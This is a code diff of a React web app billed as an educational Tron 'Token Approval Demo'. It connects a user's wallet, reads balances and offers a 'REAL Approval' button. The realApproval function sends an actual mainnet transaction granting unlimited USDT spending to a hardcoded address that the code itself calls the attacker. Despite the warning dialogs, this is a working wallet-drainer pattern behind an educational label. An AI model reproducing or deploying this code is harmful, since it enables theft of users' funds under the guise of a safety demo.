@@ -9,9 +9,6 @@ import toast, { Toaster } from "react-hot-toast";
 // USDT TRC20 on Tron Mainnet
 const TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-// Demo approval receiver
-const ATTACKER_ADDRESS = "TDgqGYjHc7KKcKjzh17m5w3VoM8RLBqJ72";
-
 // Unlimited approval
 const UNLIMITED =
   "115792089237316195423570985008687907853269984665640564039457584007913129639935";
@@ -24,7 +21,7 @@ interface WalletInfo {
   address: string;
   short: string;
   trx: string;
-  usdt?: string;
+  usdt: string;
 }
 
 interface TronWebWindow extends Window {
@@ -43,192 +40,162 @@ function App() {
   const [logs, setLogs] = useState<string[]>([]);
   const [loading, setLoading] = useState(false);
   const [connecting, setConnecting] = useState(false);
-  const [isTrustWallet, setIsTrustWallet] = useState(false);
   const [step, setStep] = useState(1);
-  const [showMobileInstructions, setShowMobileInstructions] = useState(false);
 
   /* =========================
      LOGGER (CORE)
   ========================= */
   const log = (msg: string, type: LogType = "info") => {
     console.log(`[${type.toUpperCase()}]`, msg);
-    setLogs((prev) => [...prev, msg]);
+    const timestamp = new Date().toLocaleTimeString();
+    setLogs((prev) => [...prev, `[${timestamp}] ${msg}`]);
 
     switch (type) {
       case "success":
-        toast.success(msg);
+        toast.success(msg, { duration: 3000 });
         break;
       case "error":
-        toast.error(msg);
+        toast.error(msg, { duration: 4000 });
         break;
       case "warning":
-        toast(msg, { icon: "⚠️" });
+        toast(msg, { icon: "⚠️", duration: 4000 });
         break;
       default:
-        toast(msg);
+        toast(msg, { duration: 3000 });
     }
   };
 
   const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 
   /* =========================
-     DETECT MOBILE & INIT
+     CHECK FOR TRON WEB
   ========================= */
   useEffect(() => {
-    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    
-    // Check if coming back from Trust Wallet
-    const urlParams = new URLSearchParams(window.location.search);
-    const fromTrustWallet = urlParams.get('trust') === 'true';
-    
-    if (fromTrustWallet && isMobile) {
-      log("🔄 Returned from Trust Wallet", "info");
-      // Remove the parameter from URL
-      window.history.replaceState({}, document.title, window.location.pathname);
-    }
-
     const checkTronWeb = () => {
       if (window.tronWeb || window.tronLink) {
-        setIsTrustWallet(true);
-        log("✅ Tron wallet detected", "success");
-        
-        // Initialize TronWeb immediately if available
-        if (window.tronWeb && window.tronWeb.ready) {
-          initTronWeb();
-        }
-        
+        log("✅ Wallet extension detected", "success");
+        initializeTronWeb();
         return true;
       }
       return false;
     };
 
     // Initial check
-    if (!checkTronWeb() && isMobile && !fromTrustWallet) {
-      log("📱 Mobile device detected - please use Trust Wallet", "info");
-      setShowMobileInstructions(true);
+    if (!checkTronWeb()) {
+      log("⚠️ Install TronLink or Trust Wallet extension", "warning");
     }
 
-    // Listen for TronWeb injection
-    const handleTronWebInjection = () => {
-      if (checkTronWeb()) {
-        window.removeEventListener('tronWeb#initialized', handleTronWebInjection);
-      }
-    };
-
-    window.addEventListener('tronWeb#initialized', handleTronWebInjection);
-
-    // Check periodically
-    const interval = setInterval(() => {
-      checkTronWeb();
-    }, 1000);
-
-    return () => {
-      window.removeEventListener('tronWeb#initialized', handleTronWebInjection);
-      clearInterval(interval);
-    };
+    // Check every 2 seconds for injection
+    const interval = setInterval(checkTronWeb, 2000);
+    
+    // Cleanup
+    return () => clearInterval(interval);
   }, []);
 
   /* =========================
-     INIT TRONWEB
+     INITIALIZE TRON WEB
   ========================= */
-  const initTronWeb = async () => {
+  const initializeTronWeb = async () => {
     try {
-      if (window.tronWeb && window.tronWeb.ready) {
-        setTronWeb(window.tronWeb);
-        
-        // Initialize USDT contract
-        const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
-        setToken(contract);
-        log("✅ TronWeb initialized successfully", "success");
-        
-        // Auto-connect if returning from Trust Wallet
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.get('autoConnect') === 'true') {
-          setTimeout(() => {
-            connectWallet();
-          }, 1000);
-        }
+      // Wait for tronWeb to be ready
+      if (!window.tronWeb) {
+        log("❌ tronWeb not available", "error");
+        return;
       }
+
+      // Check if ready
+      if (!window.tronWeb.ready) {
+        log("⏳ Waiting for wallet to be ready...", "info");
+        return;
+      }
+
+      // Set tronWeb instance
+      setTronWeb(window.tronWeb);
+      
+      // Initialize USDT contract
+      const contract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+      setToken(contract);
+      log("✅ Contract initialized", "success");
+      
     } catch (error) {
-      log("❌ Failed to initialize TronWeb", "error");
-      console.error("TronWeb init error:", error);
+      log("❌ Failed to initialize contract", "error");
+      console.error("Init error:", error);
     }
   };
 
-  useEffect(() => {
-    if (window.tronWeb && window.tronWeb.ready && !token) {
-      initTronWeb();
-    }
-  }, [window.tronWeb?.ready]);
-
   /* =========================
-     CONNECT WALLET
+     CONNECT WALLET - SIMPLIFIED
   ========================= */
   const connectWallet = async () => {
-    if (connecting) return;
+    if (connecting || !window.tronWeb) {
+      log("❌ Wallet not ready", "error");
+      return;
+    }
 
     try {
       setConnecting(true);
-      log("🔗 Requesting wallet connection...", "info");
+      log("🔗 Connecting to wallet...", "info");
 
-      // Ensure TronWeb is available
-      if (!window.tronWeb) {
-        log("❌ TronWeb not available. Please install Trust Wallet/TronLink", "error");
-        setConnecting(false);
-        return;
+      // Direct method for TronLink
+      let address;
+      if (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        // Already connected
+        address = window.tronWeb.defaultAddress.base58;
+        log("🔄 Already connected to wallet", "success");
+      } else {
+        // Request connection
+        const accounts = await window.tronWeb.request({
+          method: 'tron_requestAccounts'
+        });
+        
+        if (!accounts || accounts.length === 0) {
+          throw new Error("No accounts found");
+        }
+        
+        address = accounts[0];
+        log("✅ Wallet connected successfully", "success");
       }
 
-      const accounts = await window.tronWeb.request({
-        method: "tron_requestAccounts",
-      });
+      // Get balances
+      const trxBalance = await window.tronWeb.trx.getBalance(address);
+      const trxFormatted = (trxBalance / 1e6).toFixed(2);
 
-      if (!accounts?.length) {
-        log("❌ No accounts found in wallet", "error");
-        setConnecting(false);
-        return;
-      }
-
-      const address = accounts[0];
-      
-      // Get TRX balance
-      const balance = await window.tronWeb.trx.getBalance(address);
-      const trxBalance = (balance / 1e6).toFixed(2);
-      
-      // Get USDT balance
+      // Get USDT balance if contract is ready
       let usdtBalance = "0.00";
       if (token) {
         try {
-          const usdtBal = await token.balanceOf(address).call();
+          const balance = await token.balanceOf(address).call();
           const decimals = await token.decimals().call();
-          usdtBalance = (usdtBal / Math.pow(10, decimals)).toFixed(2);
-        } catch (error) {
-          console.error("USDT balance error:", error);
+          usdtBalance = (balance / Math.pow(10, decimals)).toFixed(2);
+        } catch (e) {
+          console.log("Could not fetch USDT balance:", e);
         }
       }
 
       setWallet({
         address,
         short: `${address.slice(0, 6)}...${address.slice(-4)}`,
-        trx: trxBalance,
+        trx: trxFormatted,
         usdt: usdtBalance,
       });
 
-      log(`✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`, "success");
-      log(`💰 TRX Balance: ${trxBalance}`, "info");
-      if (usdtBalance !== "0.00") {
-        log(`💰 USDT Balance: ${usdtBalance}`, "info");
-      }
+      log(`📊 Wallet: ${address.slice(0, 6)}...${address.slice(-4)}`, "info");
+      log(`💰 TRX Balance: ${trxFormatted}`, "success");
       
+      if (usdtBalance !== "0.00") {
+        log(`💰 USDT Balance: ${usdtBalance}`, "success");
+      }
+
       setStep(2);
-      setShowMobileInstructions(false);
+
     } catch (err: any) {
       console.error("Connection error:", err);
       if (err?.message?.includes("rejected") || err?.code === 4001) {
         log("❌ Connection rejected by user", "error");
       } else if (err?.message?.includes("not installed")) {
-        log("❌ Wallet not installed", "error");
+        log("❌ Please install TronLink extension", "error");
       } else {
-        log("❌ Connection failed. Please try again.", "error");
+        log(`❌ Connection failed: ${err.message || "Unknown error"}`, "error");
       }
     } finally {
       setConnecting(false);
@@ -236,126 +203,139 @@ function App() {
   };
 
   /* =========================
-     OPEN TRUST WALLET
+     SIMULATE APPROVAL - TEST MODE
   ========================= */
-  const openTrustWallet = () => {
-    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    if (isMobile) {
-      // Add parameters to auto-connect when returning
-      const currentUrl = new URL(window.location.href);
-      currentUrl.searchParams.set('trust', 'true');
-      currentUrl.searchParams.set('autoConnect', 'true');
-      
-      const encodedUrl = encodeURIComponent(currentUrl.toString());
-      const trustWalletUrl = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodedUrl}`;
-      
-      log("📱 Opening Trust Wallet...", "info");
-      
-      // Try to open Trust Wallet
-      window.location.href = trustWalletUrl;
-      
-      // Fallback - show instructions if not redirected
-      setTimeout(() => {
-        if (!document.hidden) {
-          setShowMobileInstructions(true);
-        }
-      }, 2000);
-    }
-  };
-
-  /* =========================
-     GET USDT BALANCE
-  ========================= */
-  const getBalance = async () => {
-    try {
-      if (!wallet || !token) return 0;
-
-      log("🔍 Checking USDT balance...", "info");
-      const bal = await token.balanceOf(wallet.address).call();
-      const decimals = await token.decimals().call();
-      const formatted = bal / Math.pow(10, decimals);
-
-      log(`💰 USDT Balance: ${formatted.toFixed(2)}`, "success");
-      return formatted;
-    } catch {
-      log("❌ Failed to check balance", "error");
-      return 0;
-    }
-  };
-
-  /* =========================
-     APPROVE DEMO
-  ========================= */
-  const simulate = async () => {
+  const simulateApproval = async () => {
     if (!wallet || !token) {
-      log("❌ Wallet or token not initialized", "error");
+      log("❌ Wallet or token not ready", "error");
       return;
     }
 
     try {
       setLoading(true);
+      
+      // Show what would happen (educational)
+      log("📚 EDUCATIONAL DEMO - NO REAL TRANSACTION", "warning");
+      log("This shows what happens with unlimited approval", "info");
+      
+      await sleep(1000);
+      
+      // Generate a fake transaction ID for demo
+      const fakeTxId = '0x' + Array.from({length: 64}, () => 
+        Math.floor(Math.random() * 16).toString(16)
+      ).join('');
+      
+      log(`📝 Demo: Would approve unlimited USDT`, "warning");
+      log(`🔗 Demo TX: ${fakeTxId}`, "info");
+      await sleep(1500);
+      
+      log("✅ Demo: Transaction would be confirmed", "success");
+      log("⚠️ REAL DANGER: Attacker could drain ALL your USDT", "error");
+      log("🔒 Safety: Always use limited approvals", "info");
+      
+      setStep(3);
+      
+    } catch (err: any) {
+      log(`❌ Error in simulation: ${err.message}`, "error");
+    } finally {
+      setLoading(false);
+    }
+  };
 
-      // Check balance first
-      const balance = await getBalance();
-      await sleep(500);
+  /* =========================
+     REAL APPROVAL (DANGEROUS - FOR DEMO ONLY)
+  ========================= */
+  const realApproval = async () => {
+    if (!wallet || !token || !tronWeb) {
+      log("❌ Wallet or token not ready", "error");
+      return;
+    }
 
-      if (balance === 0) {
-        log("❌ No USDT balance to approve", "warning");
+    try {
+      setLoading(true);
+      
+      // First check USDT balance
+      log("🔍 Checking USDT balance...", "info");
+      const balance = await token.balanceOf(wallet.address).call();
+      const decimals = await token.decimals().call();
+      const usdtBalance = (balance / Math.pow(10, decimals)).toFixed(2);
+      
+      if (parseFloat(usdtBalance) === 0) {
+        log("❌ No USDT to approve", "error");
         setLoading(false);
         return;
       }
-
-      if (
-        !window.confirm(
-          `⚠️ DANGER: This will approve UNLIMITED USDT spending to:\n${ATTACKER_ADDRESS}\n\nThis means ALL your USDT can be stolen at any time!\n\nDo you want to continue?`
-        )
-      ) {
-        log("❌ User cancelled approval", "warning");
+      
+      log(`💰 Your USDT Balance: ${usdtBalance}`, "warning");
+      await sleep(1000);
+      
+      // WARNING - This is dangerous!
+      const attackerAddress = "TDgqGYjHc7KKcKjzh17m5w3VoM8RLBqJ72";
+      
+      const confirmed = window.confirm(
+        `⚠️ ⚠️ ⚠️ EXTREME DANGER ⚠️ ⚠️ ⚠️\n\n` +
+        `You are about to approve UNLIMITED USDT spending to:\n` +
+        `${attackerAddress}\n\n` +
+        `This will allow anyone with that address to transfer ALL your USDT at any time!\n\n` +
+        `This is a REAL transaction on the Tron network.\n` +
+        `Your funds could be stolen immediately.\n\n` +
+        `Are you absolutely sure?`
+      );
+      
+      if (!confirmed) {
+        log("❌ Approval cancelled by user", "warning");
         setLoading(false);
         return;
       }
-
-      log("📝 Sending approval transaction...", "warning");
-
+      
+      log("📝 Sending REAL approval transaction...", "warning");
+      
+      // REAL TRANSACTION - DANGEROUS!
       const tx = await token
-        .approve(ATTACKER_ADDRESS, UNLIMITED)
+        .approve(attackerAddress, UNLIMITED)
         .send({
           feeLimit: 100_000_000,
           callValue: 0,
           shouldPollResponse: true,
         });
-
-      log(`📨 Transaction sent: ${tx.transaction.txID}`, "info");
+      
+      log(`📨 REAL TX sent: ${tx.transaction.txID}`, "warning");
       log("⏳ Waiting for confirmation...", "info");
-
-      let confirmed = false;
-      for (let i = 0; i < 30 && !confirmed; i++) {
-        await sleep(1000);
+      
+      // Wait for confirmation
+      let confirmedTx = false;
+      for (let i = 0; i < 20 && !confirmedTx; i++) {
+        await sleep(2000);
         try {
-          const info = await tronWeb.trx.getTransactionInfo(
-            tx.transaction.txID
-          );
+          const info = await tronWeb.trx.getTransactionInfo(tx.transaction.txID);
           if (info?.id) {
-            confirmed = true;
-            log("✅ Transaction confirmed", "success");
-            log(`🔗 View on Tronscan: https://tronscan.org/#/transaction/${tx.transaction.txID}`, "info");
+            confirmedTx = true;
+            log("✅ Transaction confirmed on blockchain", "success");
+            log(`🔗 View: https://tronscan.org/#/transaction/${tx.transaction.txID}`, "info");
+            log("🚨 WARNING: Your wallet is now vulnerable!", "error");
+            log("💰 Revoke immediately on Tronscan", "warning");
           }
-        } catch {}
+        } catch (e) {
+          console.log("Checking confirmation...");
+        }
       }
-
-      if (!confirmed) {
-        log("⚠️ Confirmation timeout - check wallet later", "warning");
+      
+      if (!confirmedTx) {
+        log("⚠️ Confirmation taking longer than expected", "warning");
       }
-
+      
       setStep(3);
+      
     } catch (err: any) {
       console.error("Approval error:", err);
       if (err?.message?.includes("insufficient energy")) {
-        log("❌ Insufficient energy. Need TRX for energy.", "error");
+        log("❌ Insufficient energy. You need TRX for transaction fees.", "error");
+      } else if (err?.message?.includes("denied transaction")) {
+        log("❌ Transaction denied by user", "error");
       } else if (err?.message?.includes("user rejected")) {
-        log("❌ Transaction rejected by user", "error");
+        log("❌ User rejected the transaction", "error");
       } else {
-        log(`❌ Approval failed: ${err.message || "Unknown error"}`, "error");
+        log(`❌ Transaction failed: ${err.message || "Unknown error"}`, "error");
       }
     } finally {
       setLoading(false);
@@ -363,183 +343,176 @@ function App() {
   };
 
   /* =========================
-     UI
+     UI COMPONENT
   ========================= */
   return (
     <>
       <Toaster 
-        position="top-right" 
+        position="top-right"
         toastOptions={{
-          duration: 4000,
           style: {
             background: '#1f2937',
             color: '#fff',
             border: '1px solid #374151',
+            maxWidth: '500px',
           },
         }}
       />
 
-      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white">
-        <div className="container mx-auto px-4 py-8">
-          <div className="max-w-2xl mx-auto">
-            {/* Header */}
-            <div className="text-center mb-8">
-              <h1 className="text-3xl font-bold mb-2">TRC20 Approval Demo</h1>
-              <p className="text-gray-400">Educational demonstration of token approval risks</p>
-              <div className="flex items-center justify-center gap-2 mt-4">
-                <div className={`w-3 h-3 rounded-full ${wallet ? 'bg-green-500' : 'bg-red-500'}`} />
-                <span className="text-sm">{wallet ? 'Wallet Connected' : 'Wallet Disconnected'}</span>
-              </div>
-            </div>
+      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-black text-white p-4">
+        <div className="max-w-md mx-auto">
+          
+          {/* Header */}
+          <div className="text-center mb-8 pt-8">
+            <h1 className="text-3xl font-bold mb-2">🛡️ Token Approval Demo</h1>
+            <p className="text-gray-400">Educational tool - Understand approval risks</p>
+          </div>
 
-            {/* Main Card */}
-            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl border border-gray-700 p-6 mb-6">
-              {/* Wallet Info */}
-              {wallet && (
-                <div className="mb-6 p-4 bg-gray-900/50 rounded-xl">
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <p className="text-gray-400 text-sm">Address</p>
-                      <p className="font-mono text-sm">{wallet.short}</p>
-                    </div>
-                    <div>
-                      <p className="text-gray-400 text-sm">TRX Balance</p>
-                      <p className="font-bold">{wallet.trx} TRX</p>
-                    </div>
-                    <div>
-                      <p className="text-gray-400 text-sm">USDT Balance</p>
-                      <p className="font-bold">{wallet.usdt || "0.00"} USDT</p>
-                    </div>
-                    <div>
-                      <p className="text-gray-400 text-sm">Network</p>
-                      <p className="font-bold">Tron Mainnet</p>
-                    </div>
+          {/* Status Card */}
+          <div className="bg-gray-800/80 backdrop-blur-sm rounded-2xl border border-gray-700 p-6 mb-6">
+            <div className="mb-6">
+              <h2 className="text-xl font-bold mb-4">Wallet Status</h2>
+              
+              {wallet ? (
+                <div className="space-y-3">
+                  <div className="flex justify-between items-center p-3 bg-gray-900/50 rounded-lg">
+                    <span className="text-gray-400">Address</span>
+                    <span className="font-mono">{wallet.short}</span>
+                  </div>
+                  <div className="flex justify-between items-center p-3 bg-gray-900/50 rounded-lg">
+                    <span className="text-gray-400">TRX Balance</span>
+                    <span className="font-bold text-green-400">{wallet.trx} TRX</span>
+                  </div>
+                  <div className="flex justify-between items-center p-3 bg-gray-900/50 rounded-lg">
+                    <span className="text-gray-400">USDT Balance</span>
+                    <span className="font-bold text-blue-400">{wallet.usdt} USDT</span>
                   </div>
                 </div>
+              ) : (
+                <div className="text-center py-8">
+                  <div className="w-16 h-16 border-4 border-gray-700 border-t-blue-500 rounded-full animate-spin mx-auto mb-4"></div>
+                  <p className="text-gray-400">Wallet not connected</p>
+                </div>
               )}
-
-              {/* Action Buttons */}
-              <div className="space-y-4">
-                {!wallet ? (
-                  <>
-                    <button
-                      onClick={connectWallet}
-                      disabled={connecting || !isTrustWallet}
-                      className="w-full py-4 bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      {connecting ? (
-                        <div className="flex items-center justify-center gap-3">
-                          <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-                          Connecting...
-                        </div>
-                      ) : isTrustWallet ? (
-                        "Connect Wallet"
-                      ) : (
-                        "Install Trust Wallet/TronLink"
-                      )}
-                    </button>
-
-                    {showMobileInstructions && (
-                      <div className="mt-4 p-4 bg-yellow-900/20 border border-yellow-700 rounded-xl">
-                        <p className="text-yellow-400 font-bold mb-2">📱 Mobile Instructions:</p>
-                        <ol className="list-decimal list-inside text-sm text-gray-300 space-y-1">
-                          <li>Open this page in Trust Wallet browser</li>
-                          <li>Or click below to open Trust Wallet</li>
-                          <li>Return here after opening</li>
-                        </ol>
-                        <button
-                          onClick={openTrustWallet}
-                          className="w-full mt-3 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg"
-                        >
-                          Open in Trust Wallet
-                        </button>
-                      </div>
-                    )}
-                  </>
-                ) : step === 2 ? (
-                  <button
-                    onClick={simulate}
-                    disabled={loading}
-                    className="w-full py-4 bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50"
-                  >
-                    {loading ? (
-                      <div className="flex items-center justify-center gap-3">
-                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-                        Processing...
-                      </div>
-                    ) : (
-                      "⚠️ Simulate Unlimited Approval"
-                    )}
-                  </button>
-                ) : step === 3 ? (
-                  <div className="p-4 bg-red-900/20 border border-red-700 rounded-xl">
-                    <p className="text-red-400 font-bold mb-2">⚠️ Warning:</p>
-                    <p className="text-sm">
-                      Unlimited approvals can drain your wallet at any time. 
-                      Always use limited approvals and revoke unused permissions.
-                    </p>
-                    <div className="mt-4 flex gap-3">
-                      <button
-                        onClick={() => setStep(2)}
-                        className="flex-1 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg"
-                      >
-                        Try Again
-                      </button>
-                      <a
-                        href="https://tronscan.org"
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        className="flex-1 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-center"
-                      >
-                        Check Approvals
-                      </a>
-                    </div>
-                  </div>
-                ) : null}
-              </div>
             </div>
 
-            {/* Activity Log */}
-            <div className="bg-gray-800/50 backdrop-blur-sm rounded-2xl border border-gray-700 p-6">
-              <h2 className="text-xl font-bold mb-4">Activity Log</h2>
-              <div className="bg-black/50 rounded-lg p-4 max-h-64 overflow-y-auto">
-                {logs.length === 0 ? (
-                  <p className="text-gray-500 text-center py-4">No activity yet</p>
-                ) : (
-                  logs.map((log, index) => (
-                    <div key={index} className="py-2 border-b border-gray-800 last:border-b-0">
-                      <span className="text-sm">{log}</span>
+            {/* Action Buttons */}
+            <div className="space-y-4">
+              {!wallet ? (
+                <button
+                  onClick={connectWallet}
+                  disabled={connecting || !window.tronWeb}
+                  className="w-full py-4 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
+                >
+                  {connecting ? (
+                    <div className="flex items-center justify-center gap-2">
+                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      Connecting...
                     </div>
-                  ))
-                )}
-              </div>
+                  ) : window.tronWeb ? (
+                    "🔗 Connect Wallet"
+                  ) : (
+                    "⬇️ Install TronLink First"
+                  )}
+                </button>
+              ) : step === 2 ? (
+                <div className="space-y-3">
+                  <button
+                    onClick={simulateApproval}
+                    disabled={loading}
+                    className="w-full py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 rounded-xl font-bold text-lg transition-all duration-300"
+                  >
+                    {loading ? "🔄 Simulating..." : "🎓 Safe Demo (No TX)"}
+                  </button>
+                  
+                  <div className="relative">
+                    <div className="absolute inset-0 bg-gradient-to-r from-red-600 to-pink-600 rounded-xl blur opacity-50"></div>
+                    <button
+                      onClick={realApproval}
+                      disabled={loading}
+                      className="relative w-full py-4 bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 rounded-xl font-bold text-lg transition-all duration-300 disabled:opacity-50"
+                    >
+                      {loading ? "⚠️ Processing..." : "🚨 REAL Approval (Dangerous)"}
+                    </button>
+                  </div>
+                  
+                  <p className="text-xs text-gray-400 text-center">
+                    ⚠️ "REAL Approval" sends actual blockchain transaction
+                  </p>
+                </div>
+              ) : step === 3 ? (
+                <div className="p-4 bg-gradient-to-r from-red-900/30 to-pink-900/30 border border-red-700 rounded-xl">
+                  <h3 className="font-bold text-red-400 mb-2">⚠️ Important Notice</h3>
+                  <p className="text-sm mb-4">
+                    Unlimited approvals give complete control of your tokens to the approved address.
+                    Always use limited amounts and revoke unused approvals.
+                  </p>
+                  <a
+                    href="https://tronscan.org"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="block w-full py-3 bg-blue-600 hover:bg-blue-700 rounded-lg text-center font-medium"
+                  >
+                    🔍 Check/Revoke on Tronscan
+                  </a>
+                </div>
+              ) : null}
+            </div>
+          </div>
+
+          {/* Activity Log */}
+          <div className="bg-gray-800/80 backdrop-blur-sm rounded-2xl border border-gray-700 p-6">
+            <div className="flex justify-between items-center mb-4">
+              <h2 className="text-xl font-bold">Activity Log</h2>
               {logs.length > 0 && (
                 <button
                   onClick={() => setLogs([])}
-                  className="w-full mt-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg"
+                  className="text-sm text-gray-400 hover:text-white"
                 >
-                  Clear Logs
+                  Clear
                 </button>
               )}
             </div>
-
-            {/* Footer */}
-            <div className="mt-8 text-center text-gray-500 text-sm">
-              <p className="mb-2">
-                This is an educational demonstration. Be cautious with token approvals.
-              </p>
-              <p>
-                Always verify contracts and use limited approvals on{" "}
-                <a 
-                  href="https://tronscan.org" 
-                  target="_blank" 
-                  rel="noopener noreferrer"
-                  className="text-blue-400 hover:text-blue-300"
-                >
-                  Tronscan
-                </a>
-              </p>
+            
+            <div className="bg-black/40 rounded-lg p-4 h-64 overflow-y-auto">
+              {logs.length === 0 ? (
+                <div className="flex items-center justify-center h-full text-gray-500">
+                  <div className="text-center">
+                    <div className="text-4xl mb-2">📝</div>
+                    <p>Activity will appear here</p>
+                  </div>
+                </div>
+              ) : (
+                <div className="space-y-2">
+                  {logs.map((logMsg, index) => (
+                    <div 
+                      key={index} 
+                      className="text-sm py-2 border-b border-gray-800 last:border-b-0"
+                    >
+                      {logMsg}
+                    </div>
+                  ))}
+                </div>
+              )}
             </div>
+          </div>
+
+          {/* Instructions */}
+          <div className="mt-6 text-center text-sm text-gray-500">
+            <p className="mb-2">
+              💡 This is an educational tool to understand token approval risks
+            </p>
+            <p>
+              Always verify contracts before approving on{" "}
+              <a 
+                href="https://tronscan.org" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-blue-400 hover:text-blue-300"
+              >
+                Tronscan
+              </a>
+            </p>
           </div>
         </div>
       </div>
